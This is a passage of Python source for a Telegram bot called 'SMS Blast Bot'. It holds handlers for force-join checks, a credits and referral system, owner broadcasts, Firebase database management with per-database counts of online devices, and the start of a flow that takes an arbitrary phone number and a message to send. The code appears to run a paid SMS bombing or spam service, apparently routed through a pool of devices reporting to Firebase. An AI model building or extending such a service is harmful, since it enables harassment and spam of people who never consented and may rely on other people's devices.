        await msg.answer(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif can_use(uid, d):
        await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        await msg.answer("⌨️ Quick menu:", reply_markup=reply_keyboard())
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>{sc('access nahi hai!')}</b>\n\n"
            f"{em(EMOJI_BELL, '📢')} Access ke liye group join karein:",
            reply_markup=group_kb(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

@R.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()

    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": msg.from_user.full_name or "User",
            "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
        }
        save(d)

    if not await check_joined(msg.bot, uid):
        await msg.answer(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif can_use(uid, d):
        await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        await msg.answer("⌨️ Quick menu:", reply_markup=reply_keyboard())
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '⛔')} <b>{sc('access nahi hai!')}</b>\n\n"
            f"{em(EMOJI_BELL, '📢')} Access ke liye group join karein:",
            reply_markup=group_kb(),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )

# Reply keyboard handler
@R.message(F.text.in_(set(REPLY_KEYBOARD_MAP.keys())))
async def reply_kb_handler(msg: Message, state: FSMContext):
    action = REPLY_KEYBOARD_MAP.get(msg.text)
    if not action:
        return
    uid = msg.from_user.id
    d = load()

    if action == "user:home":
        if not await check_joined(msg.bot, uid):
            await msg.answer(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML")
            return
        if is_owner(uid, d):
            await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        elif can_use(uid, d):
            await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        else:
            await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Access denied", reply_markup=group_kb(), parse_mode="HTML")
        return

    if action == "user:referral":
        await send_referral_panel(msg, uid, d)
        return

    if action in ("user:credits", "user:stats"):
        if not await check_joined(msg.bot, uid):
            await msg.answer(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML")
            return
        u = d["users"].get(str(uid), {})
        if action == "user:credits":
            await msg.answer(f"💰 Credits: <b>{u.get('credits', 0)}</b>", parse_mode="HTML")
        else:
            text = (
                f"{em(EMOJI_STAR, '📊')} <b>{sc('your stats')}</b>\n\n"
                f"Credits: <b>{u.get('credits', 0)}</b>\n"
                f"SMS sent: <b>{u.get('uses', 0)}</b>\n"
                f"Referrals: <b>{d.get('referral_counts', {}).get(str(uid), 0)}</b>\n"
                f"Joined: <b>{fmt_time(u.get('joined_at', 0))}</b>"
            )
            await msg.answer(text, reply_markup=back_kb("user"), parse_mode="HTML")
        return

    if action == "user:info":
        await msg.answer(
            f"{em(EMOJI_GEAR, 'ℹ️')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {VERSION}</b>\n\n"
            f"Owner: <b>{OWNER_NAME}</b>\n"
            f"Support: join our group.",
            reply_markup=group_kb(back_prefix="user"),
            parse_mode="HTML",
        )
        return

    if action == "user:send":
        if not await check_joined(msg.bot, uid):
            await msg.answer(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML")
            return
        if not can_use(uid, d):
            await msg.answer("🚫 Access denied!", reply_markup=group_kb(), parse_mode="HTML")
            return
        await state.set_state(S.send_number)
        await msg.answer(
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
            reply_markup=back_kb("user"),
            parse_mode="HTML",
        )

async def send_referral_panel(msg: Message, uid: int, d: dict):
    me = await msg.bot.get_me()
    ref_link = f"https://t.me/{me.username}?start={uid}"
    ref_count = d.get("referral_counts", {}).get(str(uid), 0)
    text = (
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('referral program')}</b>\n\n"
        f"{em(EMOJI_STAR, '👥')} ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs: <b>{ref_count}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ: <b>{REFERRAL_REWARD} credits</b>\n\n"
        f"{em(EMOJI_ROCKET, '🔗')} ʏᴏᴜʀ ʟɪɴᴋ:\n<code>{ref_link}</code>\n\n"
        f"<i>Share this link. When someone joins via your link, you get {REFERRAL_REWARD} credits!</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📤 {sc('share link')}", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20bot!", style="success")],
        [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")],
    ])
    await msg.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "fj:check")
async def cb_fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not await check_joined(cq.bot, uid):
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(), reply_markup=force_join_kb(), parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest:
            pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    d = load()
    try:
        if is_owner(uid, d):
            await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        elif can_use(uid, d):
            await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        else:
            await cq.message.edit_text(
                f"{em(EMOJI_CROSS, '⛔')} <b>{sc('access nahi hai!')}</b>",
                reply_markup=group_kb(),
                parse_mode="HTML",
            )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def cb_owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "owner:fb_stats")
async def cb_owner_fb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    lines = [f"{em(EMOJI_FIRE, '🔥')} <b>{sc('firebase stats')}</b>\n"]
    for fb in d["firebases"]:
        c = FB_DEVICE_COUNTS.get(fb["id"], {}).get("online", 0)
        st = "🟢" if c > 0 else "🔴"
        lines.append(f"{st} <code>{fb['label'][:20]}</code> — {c}")
    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3900] + "\n<i>...</i>"
    try:
        await cq.message.edit_text(text, reply_markup=back_kb("owner"), parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "owner:stats")
async def cb_owner_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    stats = d.get("stats", {})
    text = (
        f"{em(EMOJI_STAR, '📊')} <b>{sc('bot stats')}</b>\n\n"
        f"Version: <b>{VERSION}</b>\n"
        f"Firebases: <b>{len(d['firebases'])}</b>\n"
        f"Online: <b>{len(CACHED_DEVICES)}</b>\n"
        f"Sent: <b>{stats.get('total_sent', 0)}</b>\n"
        f"Failed: <b>{stats.get('total_failed', 0)}</b>\n"
        f"Users: <b>{len(d['users'])}</b>"
    )
    try:
        await cq.message.edit_text(text, reply_markup=back_kb("owner"), parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "owner:user_list")
async def cb_owner_user_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    users = d.get("users", {})
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')}</b> ({len(users)})\n"]
    for uid_str, u in list(users.items())[:50]:
        lines.append(f"<code>{uid_str}</code> — {u.get('name', '?')[:15]} | 💰{u.get('credits', 0)}")
    if len(users) > 50:
        lines.append(f"\n<i>... and {len(users)-50} more</i>")
    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3900] + "\n<i>...</i>"
    try:
        await cq.message.edit_text(text, reply_markup=back_kb("owner"), parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def cb_owner_free(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    await cq.answer(f"Free mode: {'ON' if d['free_mode'] else 'OFF'}", show_alert=True)
    try:
        d = load()
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

# ---------- GIVE CREDITS ----------
@R.callback_query(F.data == "owner:give_credits")
async def cb_give_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.give_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('give credits')}</b>\n\n"
        f"{sc('send user id')}:\n<i>Example: 8607409134</i>\n\n"
        f"{sc('or send')} <code>amount|user_id</code>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.give_credits_uid)
async def got_credit_uid(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    txt = (msg.text or "").strip()
    # Support direct "amount|uid" format
    if "|" in txt:
        parts = txt.split("|", 1)
        try:
            amount = int(parts[0].strip())
            uid = int(parts[1].strip())
        except Exception:
            await msg.answer("❌ Invalid format. Use <code>amount|user_id</code>", parse_mode="HTML")
            return
        await state.clear()
        await _do_give_credits(msg, uid, amount)
        return
    try:
        uid = int(txt)
    except Exception:
        await msg.answer("❌ Invalid user ID.", parse_mode="HTML")
        return
    if str(uid) not in d["users"]:
        await msg.answer("❌ User not found in DB.", parse_mode="HTML")
        return
    await state.update_data(target_uid=uid)
    await state.set_state(S.give_credits_amount)
    await msg.answer(
        f"👤 Target: <code>{uid}</code>\n💰 Current: <b>{get_credits(uid, d)}</b>\n\n"
        f"{sc('send amount (negative to deduct)')}:",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )

@R.message(S.give_credits_amount)
async def got_credit_amount(msg: Message, state: FSMContext):
    data = await state.get_data()
    uid = data.get("target_uid")
    await state.clear()
    if not uid:
        await msg.answer("❌ Session expired.")
        return
    try:
        amount = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Invalid amount.", parse_mode="HTML")
        return
    await _do_give_credits(msg, uid, amount)

async def _do_give_credits(msg: Message, uid: int, amount: int):
    d = load()
    if not add_credits(uid, amount, d):
        await msg.answer("❌ User not found.", parse_mode="HTML")
        return
    save(d)
    new_bal = get_credits(uid, d)
    sign = "+" if amount >= 0 else ""
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{sc('credits updated')}</b>\n\n"
        f"👤 User: <code>{uid}</code>\n"
        f"💰 Change: <b>{sign}{amount}</b>\n"
        f"💳 New balance: <b>{new_bal}</b>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>{sc('credits updated')}</b>\n\n"
            f"Change: <b>{sign}{amount}</b>\nBalance: <b>{new_bal}</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass

# ---------- BROADCAST ----------
@R.callback_query(F.data == "owner:broadcast")
async def cb_broadcast(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.broadcast_message)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>{sc('broadcast')}</b>\n\n"
        f"{sc('send the message to broadcast to all users')}.",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.broadcast_message)
async def do_broadcast(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    body = (msg.text or msg.caption or "").strip()
    if not body:
        await msg.answer("❌ Empty message.", parse_mode="HTML")
        return
    await state.clear()

    users = list(d.get("users", {}).keys())
    status = await msg.answer(
        f"{em(EMOJI_WARNING, '⏳')} Broadcasting to <b>{len(users)}</b> users...",
        parse_mode="HTML",
    )
    sent = failed = 0
    batch = 25
    for i in range(0, len(users), batch):
        chunk = users[i:i+batch]
        tasks = []
        for uid_str in chunk:
            try:
                uid = int(uid_str)
            except Exception:
                continue
            tasks.append(_bc_send(msg.bot, uid, body))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r is True:
                sent += 1
            else:
                failed += 1
        # update status every batch
        try:
            pct = int(((i + len(chunk)) / max(1, len(users))) * 100)
            bar = build_progress_bar(pct)
            await status.edit_text(
                f"📢 *Broadcasting...*\n\n`{bar}`\n\n"
                f"✅ Sent: {sent}\n❌ Failed: {failed}\n📊 Total: {len(users)}",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        await asyncio.sleep(0.5)

    await status.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>{sc('broadcast complete')}</b>\n\n"
        f"✅ Sent: <b>{sent}</b>\n"
        f"❌ Failed: <b>{failed}</b>\n"
        f"📊 Total: <b>{len(users)}</b>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )

async def _bc_send(bot: Bot, uid: int, text: str) -> bool:
    try:
        await bot.send_message(uid, text, parse_mode="HTML", disable_web_page_preview=True)
        return True
    except Exception:
        return False

# ---------- FORCE JOIN SETTINGS ----------
@R.callback_query(F.data == "owner:fj_settings")
async def cb_fj_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    fj = d.get("force_join", {})
    text = (
        f"{em(EMOJI_LOCK, '🔒')} <b>{sc('force join settings')}</b>\n\n"
        f"📢 Channel enabled: <b>{fj.get('channel_enabled')}</b>\n"
        f"   ID: <code>{fj.get('channel_id')}</code>\n"
        f"   Link: {fj.get('channel_link')}\n\n"
        f"💬 Group enabled: <b>{fj.get('group_enabled')}</b>\n"
        f"   ID: <code>{fj.get('group_id')}</code>\n"
        f"   Link: {fj.get('group_link')}"
    )
    try:
        await cq.message.edit_text(text, reply_markup=fj_settings_kb(d), parse_mode="HTML", disable_web_page_preview=True)
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data.startswith("owner:fj:ch:"))
async def cb_fj_ch_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    val = cq.data.split(":")[-1] == "on"
    d.setdefault("force_join", {})["channel_enabled"] = val
    save(d)
    await cq.answer(f"Channel FJ: {'ON' if val else 'OFF'}")
    d = load()
    fj = d.get("force_join", {})
    text = (
        f"{em(EMOJI_LOCK, '🔒')} <b>{sc('force join settings')}</b>\n\n"
        f"📢 Channel enabled: <b>{fj.get('channel_enabled')}</b>\n"
        f"   ID: <code>{fj.get('channel_id')}</code>\n"
        f"   Link: {fj.get('channel_link')}\n\n"
        f"💬 Group enabled: <b>{fj.get('group_enabled')}</b>\n"
        f"   ID: <code>{fj.get('group_id')}</code>\n"
        f"   Link: {fj.get('group_link')}"
    )
    try:
        await cq.message.edit_text(text, reply_markup=fj_settings_kb(d), parse_mode="HTML", disable_web_page_preview=True)
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fj:gr:"))
async def cb_fj_gr_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    val = cq.data.split(":")[-1] == "on"
    d.setdefault("force_join", {})["group_enabled"] = val
    save(d)
    await cq.answer(f"Group FJ: {'ON' if val else 'OFF'}")
    d = load()
    fj = d.get("force_join", {})
    text = (
        f"{em(EMOJI_LOCK, '🔒')} <b>{sc('force join settings')}</b>\n\n"
        f"📢 Channel enabled: <b>{fj.get('channel_enabled')}</b>\n"
        f"   ID: <code>{fj.get('channel_id')}</code>\n"
        f"   Link: {fj.get('channel_link')}\n\n"
        f"💬 Group enabled: <b>{fj.get('group_enabled')}</b>\n"
        f"   ID: <code>{fj.get('group_id')}</code>\n"
        f"   Link: {fj.get('group_link')}"
    )
    try:
        await cq.message.edit_text(text, reply_markup=fj_settings_kb(d), parse_mode="HTML", disable_web_page_preview=True)
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:fj:ch_id")
async def cb_fj_ch_id(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.fj_channel_id)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '🆔')} {sc('send channel id (e.g. -1001234567890)')}:",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.fj_channel_id)
async def got_fj_ch_id(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await state.clear()
    try:
        cid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Invalid ID.", parse_mode="HTML")
        return
    d.setdefault("force_join", {})["channel_id"] = cid
    save(d)
    await msg.answer(f"✅ Channel ID set to <code>{cid}</code>", reply_markup=back_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:ch_link")
async def cb_fj_ch_link(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.fj_channel_link)
    await cq.message.edit_text(
        f"{em(EMOJI_ROCKET, '🔗')} {sc('send channel invite link')}:",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.fj_channel_link)
async def got_fj_ch_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await state.clear()
    link = (msg.text or "").strip()
    if not link.startswith("http"):
        await msg.answer("❌ Invalid link.", parse_mode="HTML")
        return
    d.setdefault("force_join", {})["channel_link"] = link
    save(d)
    await msg.answer(f"✅ Channel link set.", reply_markup=back_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:gr_id")
async def cb_fj_gr_id(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.fj_group_id)
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, '🆔')} {sc('send group id')}:",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.fj_group_id)
async def got_fj_gr_id(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await state.clear()
    try:
        gid = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Invalid ID.", parse_mode="HTML")
        return
    d.setdefault("force_join", {})["group_id"] = gid
    save(d)
    await msg.answer(f"✅ Group ID set to <code>{gid}</code>", reply_markup=back_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:gr_link")
async def cb_fj_gr_link(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.fj_group_link)
    await cq.message.edit_text(
        f"{em(EMOJI_ROCKET, '🔗')} {sc('send group invite link')}:",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.fj_group_link)
async def got_fj_gr_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    await state.clear()
    link = (msg.text or "").strip()
    if not link.startswith("http"):
        await msg.answer("❌ Invalid link.", parse_mode="HTML")
        return
    d.setdefault("force_join", {})["group_link"] = link
    save(d)
    await msg.answer("✅ Group link set.", reply_markup=back_kb("owner"), parse_mode="HTML")

# ---------- FIREBASE MANAGEMENT ----------
@R.callback_query(F.data == "owner:fb_mgmt")
async def cb_fb_mgmt(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>{sc('firebase management')}</b>\n\n"
        f"Total: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_mgmt_kb(),
        parse_mode="HTML",
    )
    await cq.answer()

@R.callback_query(F.data == "owner:fb_add")
async def cb_fb_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_fb_url)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '➕')} {sc('send firebase url')}:\n"
        f"<i>Example: https://myproject-default-rtdb.firebaseio.com</i>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.add_fb_url)
async def got_fb_url(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    url = (msg.text or "").strip().rstrip("/")
    if not url.startswith("http"):
        await msg.answer("❌ Invalid URL.", parse_mode="HTML")
        return
    await state.update_data(fb_url=url)
    await state.set_state(S.add_fb_label)
    await msg.answer(
        f"🏷️ {sc('send a short label (or')} <code>-</code> {sc('to auto-generate')}):",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )

@R.message(S.add_fb_label)
async def got_fb_label(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        return
    data = await state.get_data()
    await state.clear()
    url = data.get("fb_url")
    if not url:
        await msg.answer("❌ Session expired.")
        return
    label = (msg.text or "").strip()
    if label == "-" or not label:
        label = url.replace("https://", "").split(".")[0][:20]
    # generate id
    existing = [f["id"] for f in d.get("firebases", [])]
    n = 0
    while f"fb{n:03d}" in existing:
        n += 1
    fb_id = f"fb{n:03d}"
    d.setdefault("firebases", []).append({
        "id": fb_id, "url": url, "label": label[:30], "added_at": int(time.time()),
    })
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase added!</b>\n\n"
        f"ID: <code>{fb_id}</code>\nLabel: {label[:30]}\nURL: {url}",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:fb_list")
async def cb_fb_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    fbs = d.get("firebases", [])
    lines = [f"{em(EMOJI_FIRE, '🔥')} <b>{sc('firebases')}</b> ({len(fbs)})\n"]
    for fb in fbs[:30]:
        online = FB_DEVICE_COUNTS.get(fb["id"], {}).get("online", 0)
        st = "🟢" if online > 0 else "🔴"
        lines.append(f"{st} <code>{fb['id']}</code> {fb['label'][:18]} — {online}")
    if len(fbs) > 30:
        lines.append(f"\n<i>... and {len(fbs)-30} more</i>")
    text = "\n".join(lines)
    if len(text) > 3900:
        text = text[:3900] + "\n<i>...</i>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [btn("ʙᴀᴄᴋ", "owner:fb_mgmt", EMOJI_GEAR, "🔙")],
    ])
    try:
        await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

# ---------- USER PANELS ----------
@R.callback_query(F.data == "user:home")
async def cb_user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    uid = cq.from_user.id
    if not await check_joined(cq.bot, uid):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    d = load()
    try:
        if is_owner(uid, d):
            await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        elif can_use(uid, d):
            await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
        else:
            await cq.message.edit_text(
                f"{em(EMOJI_CROSS, '⛔')} <b>{sc('access nahi hai!')}</b>",
                reply_markup=group_kb(),
                parse_mode="HTML",
            )
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "user:credits")
async def cb_user_credits(cq: CallbackQuery, state: FSMContext):
    if not await check_joined(cq.bot, cq.from_user.id):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    d = load()
    await cq.answer(f"💰 Credits: {get_credits(cq.from_user.id, d)}", show_alert=True)

@R.callback_query(F.data == "user:stats")
async def cb_user_stats(cq: CallbackQuery, state: FSMContext):
    if not await check_joined(cq.bot, cq.from_user.id):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    d = load()
    u = d["users"].get(str(cq.from_user.id), {})
    text = (
        f"{em(EMOJI_STAR, '📊')} <b>{sc('your stats')}</b>\n\n"
        f"Credits: <b>{u.get('credits', 0)}</b>\n"
        f"SMS sent: <b>{u.get('uses', 0)}</b>\n"
        f"Referrals: <b>{d.get('referral_counts', {}).get(str(cq.from_user.id), 0)}</b>\n"
        f"Joined: <b>{fmt_time(u.get('joined_at', 0))}</b>"
    )
    try:
        await cq.message.edit_text(text, reply_markup=back_kb("user"), parse_mode="HTML")
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "user:referral")
async def cb_user_referral(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not await check_joined(cq.bot, uid):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    d = load()
    me = await cq.bot.get_me()
    ref_link = f"https://t.me/{me.username}?start={uid}"
    ref_count = d.get("referral_counts", {}).get(str(uid), 0)
    text = (
        f"{em(EMOJI_GIFT, '🎁')} <b>{sc('referral program')}</b>\n\n"
        f"{em(EMOJI_STAR, '👥')} ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟs: <b>{ref_count}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ: <b>{REFERRAL_REWARD} credits</b>\n\n"
        f"{em(EMOJI_ROCKET, '🔗')} ʏᴏᴜʀ ʟɪɴᴋ:\n<code>{ref_link}</code>\n\n"
        f"<i>Share this link. When someone joins via your link, you get {REFERRAL_REWARD} credits!</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📤 {sc('share link')}", url=f"https://t.me/share/url?url={ref_link}&text=Join%20this%20awesome%20bot!", style="success")],
        [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")],
    ])
    try:
        await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    except TelegramBadRequest:
        pass
    await cq.answer()

@R.callback_query(F.data == "user:info")
async def cb_user_info(cq: CallbackQuery, state: FSMContext):
    if not await check_joined(cq.bot, cq.from_user.id):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    text = (
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {VERSION}</b>\n\n"
        f"Owner: <b>{OWNER_NAME}</b>\n"
        f"Support: join our group."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"💬 {sc('join support group')}", url=GROUP_LINK, style="success")],
        [btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")],
    ])
    try:
        await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
    except TelegramBadRequest:
        pass
    await cq.answer()

# ---------- OWNER SEND ----------
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Number enter karein:\n<i>Example: +919876543210</i>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    n = (msg.text or "").strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number.", parse_mode="HTML")
        return
    await state.update_data(number=n)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} {mask_number(n)}\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    body = (msg.text or "").strip()
    if not body:
